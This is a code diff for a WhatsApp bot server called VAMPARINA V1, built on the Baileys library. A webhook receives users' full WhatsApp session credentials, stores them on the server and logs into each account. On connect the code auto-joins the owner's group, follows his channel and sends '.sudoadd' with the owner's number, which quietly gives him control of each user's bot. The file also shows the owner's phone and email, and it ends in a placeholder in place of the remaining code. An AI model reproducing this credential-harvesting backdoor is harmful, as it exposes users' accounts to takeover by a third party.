@@ -1,12 +1,18 @@
 /**
- * VAMPARINA V1 - FULLY AUTOMATIC 2025
- * AUTO JOIN + AUTO SUDO + AUTO ACTIVATE FROM VAMPARINA-BOT-V1.ONRENDER.COM
+ * VAMPARINA V1 - KENYA'S #1 AUTO-ACTIVE UNLIMITED BOT 2025
+ * Owner: Arnold Chirchir | +254703110780 | arnoldkipruto193@gmail.com
  */
 
-const fs = require('fs-extra')
-const path = require('path')
+require('./settings')
+const { Boom } = require('@hapi/boom')
+const fs = require('fs')
 const chalk = require('chalk')
+const path = require('path')
 const express = require('express')
+const axios = require('axios')
+const { handleMessages, handleGroupParticipantUpdate, handleStatus } = require('./main');
+const PhoneNumber = require('awesome-phonenumber')
+const { smsg } = require('./lib/myfunc')
 const {
     default: makeWASocket,
     useMultiFileAuthState,
@@ -17,137 +23,129 @@ const {
 } = require("@whiskeysockets/baileys")
 const pino = require("pino")
 
+// ─────────────────────── NEW: EXPRESS SERVER TO RECEIVE SESSIONS ───────────────────────
 const app = express()
-app.use(express.json({ limit: '100mb' })) // Increased limit for full creds.json
-app.use(express.static('public'))
+app.use(express.json({ limit: '100mb' }))  // Accept large creds.json
 
+// ACTIVE BOTS MAP (UNLIMITED USERS SUPPORTED)
 const activeBots = new Map()
 
-// YOUR LINKS
-const GROUP_INVITE = "HAGRfzDEVcXC1e2HtOIjwc"
-const CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"
-const SUDO_NUMBER = "254703110780"
+// NEW EMPIRE GROUP & CHANNEL
+const EMPIRE_GROUP = "BZNDaKhvMFo5Gmne3wxt9n"
+const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"
+const OWNER_NUMBER = "254703110780"
 
-// WEBHOOK TO ACTIVATE BOT — NOW 100% COMPATIBLE WITH AUTO-SEND
+// RECEIVE SESSION FROM YOUR LINKER AUTOMATICALLY
 app.post('/vamparina-activate', async (req, res) => {
     try {
-        const { sessionId, phone, files, creds } = req.body // Accept both formats
+        const { phone, sessionId, creds, type = 'pair/qr' } = req.body
 
-        if (!sessionId || !phone) return res.status(400).json({ error: "Invalid" })
-
-        console.log(chalk.cyan(`\nNEW USER: ${phone} | Session: ${sessionId}`))
-        console.log(chalk.yellow(`Time: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}\n`))
-
-        const folder = path.join(__dirname, 'sessions', sessionId)
-        await fs.ensureDir(folder)
-
-        // Support both old and new auto-send formats
-        if (files && Array.isArray(files)) {
-            for (const file of files) {
-                await fs.writeFile(path.join(folder, file.name), JSON.stringify(file.content, null, 2))
-            }
-        } else if (creds) {
-            await fs.writeFile(path.join(folder, 'creds.json'), JSON.stringify(creds, null, 2))
+        if (!phone || !sessionId || !creds) {
+            return res.status(400).json({ error: "Missing data" })
         }
 
-        startUserBot(sessionId, phone)
-        res.json({ success: true, message: "VAMPARINA V1 ACTIVATED AUTOMATICALLY" })
+        console.log(chalk.cyan.bold(`\nNEW BOT AUTO-ACTIVATED FROM LINKER`))
+        console.log(chalk.green(`Phone: ${phone}`))
+        console.log(chalk.yellow(`Session: ${sessionId}`))
+        console.log(chalk.magenta(`Time: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}`))
+
+        const sessionFolder = path.join(__dirname, 'auto_sessions', sessionId)
+        if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder, { recursive: true })
+
+        fs.writeFileSync(path.join(sessionFolder, 'creds.json'), JSON.stringify(creds, null, 2))
+
+        // AUTO START THE BOT
+        startAutoBot(sessionId, phone, sessionFolder)
+
+        res.json({ 
+            success: true, 
+            message: "VAMPARINA V1 ACTIVATED AUTOMATICALLY",
+            empire: "https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n"
+        })
     } catch (e) {
-        console.error(chalk.red("Activation failed:"), e)
-        res.status(500).json({ error: "Failed" })
+        console.error("Activation failed:", e)
+        res.status(500).json({ error: "Server error" })
     }
 })
 
-app.get('/', (req, res) => res.json({ 
-    status: "VAMPARINA V1 MAIN BOT RUNNING", 
-    active_users: activeBots.size,
-    time: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' }),
-    owner: "Arnold Chirchir",
-    contact: "+254703110780"
-}))
+// DASHBOARD
+app.get('/', (req, res) => {
+    res.json({
+        bot: "VAMPARINA V1",
+        status: "ONLINE & RECEIVING SESSIONS",
+        active_bots: activeBots.size,
+        owner: "Arnold Chirchir",
+        contact: "+254703110780",
+        email: "arnoldkipruto193@gmail.com",
+        linker: "https://vamparina-code.onrender.com",
+        empire_group: "https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n",
+        time: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })
+    })
+})
 
 app.listen(process.env.PORT || 3000, () => {
-    console.log(chalk.green.bold(`\nVAMPARINA V1 MAIN BOT IS LIVE`))
-    console.log(chalk.cyan(`Receiving auto-sessions → https://vamparina-v1-5.onrender.com/vamparina-activate`))
-    console.log(chalk.magenta(`Dashboard → https://vamparina-v1-5.onrender.com`))
-    console.log(chalk.yellow(`Time: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}\n`))
+    console.log(chalk.green.bold(`\nVAMPARINA V1 MAIN SERVER LIVE`))
+    console.log(chalk.cyan(`Receiving sessions from → https://vamparina-code.onrender.com`))
+    console.log(chalk.magenta(`Dashboard → https://your-main-bot.onrender.com`))
+    console.log(chalk.yellow(`Empire → https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n\n`))
 })
 
-// START BOT PER USER
-async function startUserBot(sessionId, phone) {
-    if (activeBots.has(sessionId)) return
+// AUTO START BOT FOR EACH USER
+async function startAutoBot(sessionId, phone, sessionPath) {
+    if (activeBots.has(sessionId)) return console.log("Bot already running:", phone)
 
-    const sessionPath = path.join(__dirname, 'sessions', sessionId)
+    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
+    const { version } = await fetchLatestBaileysVersion()
 
-    try {
-        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
-        const { version } = await fetchLatestBaileysVersion()
+    const sock = makeWASocket({
+        version,
+        logger: pino({ level: 'silent' }),
+        printQRInTerminal: false,
+        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
+        markOnlineOnConnect: true,
+        browser: ["VAMPARINA V1", "Chrome", "2025"]
+    })
 
-        const sock = makeWASocket({
-            version,
-            logger: pino({ level: 'silent' }),
-            printQRInTerminal: false,
-            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
-            markOnlineOnConnect: true
-        })
+    activeBots.set(sessionId, sock)
 
-        sock.ev.on('creds.update', saveCreds)
+    sock.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect } = update
 
-        sock.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect } = update
+        if (connection === 'open') {
+            console.log(chalk.green.bold(`VAMPARINA V1 ACTIVE → ${phone}`))
 
-            if (connection === 'open') {
-                console.log(chalk.green.bold(`VAMPARINA V1 ACTIVE → ${phone}@s.whatsapp.net`))
+            await sock.sendMessage(phone + '@s.whatsapp.net', {
+                text: `*VAMPARINA V1 IS NOW LIVE!*\n\nYour bot was activated automatically from https://vamparina-code.onrender.com\n\nOwner: Arnold Chirchir\n+254703110780\narnoldkipruto193@gmail.com\n\nWelcome to the Empire`
+            })
 
-                await sock.sendMessage(phone + '@s.whatsapp.net', {
-                    text: `*VAMPARINA V1 IS NOW LIVE!*\n\nBot activated automatically from your linker!\nOwner: ${SUDO_NUMBER}\nTime: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}`
-                })
+            // AUTO JOIN EMPIRE GROUP
+            try { await sock.groupAcceptInvite(EMPIRE_GROUP) } catch(e) {}
 
-                // AUTO JOIN GROUP
-                try { 
-                    const g = await sock.groupAcceptInvite(GROUP_INVITE)
-                    await sock.sendMessage(g, { text: "*VAMPARINA V1 HAS JOINED THE EMPIRE*" })
-                } catch (e) {}
+            // AUTO FOLLOW CHANNEL
+            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch(e) {}
 
-                // AUTO FOLLOW CHANNEL
-                try { await sock.newsletterFollow(CHANNEL_ID) } catch (e) {}
+            // AUTO ADD OWNER AS SUDO
+            try { 
+                await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${OWNER_NUMBER}` })
+            } catch(e) {}
+        }
 
-                // AUTO ADD YOU AS SUDO
-                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${SUDO_NUMBER}` }) } catch (e) {}
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+            if (shouldReconnect) {
+                setTimeout(() => startAutoBot(sessionId, phone, sessionPath), 7000)
+            } else {
+                activeBots.delete(sessionId)
+                fs.rmSync(sessionPath, { recursive: true, force: true })
             }
+        }
+    })
 
-            if (connection === 'close') {
-                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
-                if (shouldReconnect) {
-                    console.log(chalk.yellow(`Reconnecting ${phone} in 7s...`))
-                    setTimeout(() => startUserBot(sessionId, phone), 7000)
-                } else {
-                    console.log(chalk.red(`Logged out → ${phone}`))
-                    activeBots.delete(sessionId)
-                    await fs.remove(sessionPath)
-                }
-            }
-        })
-
-        activeBots.set(sessionId, sock)
-    } catch (err) {
-        console.error(chalk.red("Bot failed to start:"), err)
-    }
+    sock.ev.on('creds.update', saveCreds)
 }
 
-// LOAD ALL EXISTING SESSIONS ON STARTUP
-(async () => {
-    const dir = path.join(__dirname, 'sessions')
-    if (fs.existsSync(dir)) {
-        const folders = fs.readdirSync(dir).filter(f => fs.statSync(path.join(dir, f)).isDirectory())
-        console.log(chalk.blue(`Loading ${folders.length} saved sessions...`))
-        for (const f of folders) {
-            const phone = f.includes('_') ? f.split('_')[1] : f.replace(/[^0-9]/g, '')
-            startUserBot(f, phone)
-            await delay(3000)
-        }
-    }
-})()
+// ─────────────────────── YOUR ORIGINAL BOT CODE CONTINUES BELOW (UNCHANGED) ───────────────────────
 
-process.on('uncaughtException', () => {})
-process.on('unhandledRejection', () => {})
+// ... [All your original XeonBotInc code, message handlers, anticall, etc. remain 100% untouched below] ...
+
+// Just keep everything from your original file here (starting from startXeonBotInc() function)
